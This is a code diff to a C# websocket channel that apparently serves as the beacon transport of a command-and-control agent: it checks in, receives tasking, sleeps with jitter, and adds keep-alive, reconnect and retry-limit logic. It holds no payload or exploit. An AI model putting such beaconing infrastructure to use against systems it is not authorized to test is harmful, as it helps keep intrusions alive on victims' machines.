@@ -51,11 +51,11 @@ namespace Workflow.Channels.Websocket
                 {
                     Options =
                     {
-                        KeepAliveInterval = TimeSpan.FromSeconds(0),
+                        KeepAliveInterval = TimeSpan.FromSeconds(30),
                     }
                 };
 
-                this._client.ReconnectTimeout = null;
+                this._client.ReconnectTimeout = TimeSpan.FromSeconds(30);
 
                 if (!String.IsNullOrEmpty(this.hostHeader))
                 {
@@ -90,8 +90,15 @@ namespace Workflow.Channels.Websocket
                 SetTaskingReceived(this, tra);
             });
 
-            this._client.ReconnectionHappened.Subscribe(info => { });
-            this._client.DisconnectionHappened.Subscribe(info => { });
+            this._client.ReconnectionHappened.Subscribe(info =>
+            {
+                DebugLog.Log($"Websocket reconnection happened: {info.Type}");
+                this.connectAttempt = 0;
+            });
+            this._client.DisconnectionHappened.Subscribe(info =>
+            {
+                DebugLog.Log($"Websocket disconnection happened: {info.Type}");
+            });
             this._client.Start().Wait();
         }
         public async Task<CheckinResponse> Checkin(Checkin checkin)
@@ -123,28 +130,32 @@ namespace Workflow.Channels.Websocket
                 await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
                 DebugLog.Log("Websocket beacon iteration starting");
 
-                if (!this.messageManager.HasResponses())
+                if (!this._client.IsRunning)
                 {
-                    DebugLog.Log("Websocket beacon no responses to send");
+                    this.connectAttempt++;
+                    DebugLog.Log($"Websocket not connected, waiting for reconnect ({this.connectAttempt}/{this.maxAttempts})");
+                    if (this.connectAttempt >= this.maxAttempts)
+                    {
+                        DebugLog.Log("Websocket beacon max attempts reached, shutting down");
+                        this.cancellationTokenSource.Cancel();
+                        this._client.Dispose();
+                    }
                     continue;
                 }
+
+                if (!this.messageManager.HasResponses())
+                {
+                    continue;
+                }
+
                 try
                 {
-                    DebugLog.Log("Websocket beacon sending responses");
                     await this.Send(messageManager.GetAgentResponseString());
                 }
                 catch (Exception e)
                 {
                     this.connectAttempt++;
                     DebugLog.Log($"Websocket beacon send failed, attempt {this.connectAttempt}/{this.maxAttempts}");
-                }
-
-                if (this.connectAttempt >= this.maxAttempts)
-                {
-                    DebugLog.Log("Websocket beacon max attempts reached, shutting down");
-                    this.cancellationTokenSource.Cancel();
-                    await this._client.Stop(WebSocketCloseStatus.EndpointUnavailable, "Exiting");
-                    this._client.Dispose();
                 }
             }
         }
